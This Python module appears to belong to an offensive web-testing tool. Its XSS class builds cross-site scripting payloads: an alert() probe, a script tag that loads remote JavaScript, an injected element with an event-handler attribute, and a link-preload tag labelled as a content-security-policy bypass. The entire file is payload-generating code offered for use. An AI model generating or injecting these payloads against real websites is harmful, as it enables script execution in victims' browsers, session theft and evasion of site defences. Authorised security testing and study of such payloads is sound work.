#!/usr/bin/env python
# -*- coding: utf-8 -*-

from payloads.payload import Payload


class XSS(Payload):

    """generate XSS payload"""

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    def alterTest(self, p=False):
        return "<script>alert(/xss/)</script>"

    def script(self, p=False):
        payload = "<script src='%s'></script>" % self.payload
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url
